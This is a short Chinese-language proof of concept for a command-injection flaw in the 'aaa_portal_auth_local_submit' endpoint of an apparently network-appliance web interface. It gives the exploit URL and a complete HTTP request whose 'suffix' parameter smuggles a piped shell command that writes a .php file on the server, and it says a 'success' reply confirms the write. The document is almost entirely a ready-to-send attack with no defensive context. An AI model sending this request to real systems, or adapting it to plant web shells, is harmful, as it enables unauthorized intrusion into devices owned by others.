漏洞链接

https://127.0.0.1/webui/?g=aaa_portal_auth_local_submit&bkg_flag=0&$type=1&suffix=1%7Cecho+%22415066557%22+%3E+.87919.php

漏洞数据包

```plain
GET /webui/?g=aaa_portal_auth_local_submit&bkg_flag=0&$type=1&suffix=1%7Cecho+%22415066557%22+%3E+.87919.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```

如果返回包出现 success ,代表文件已经上传成功
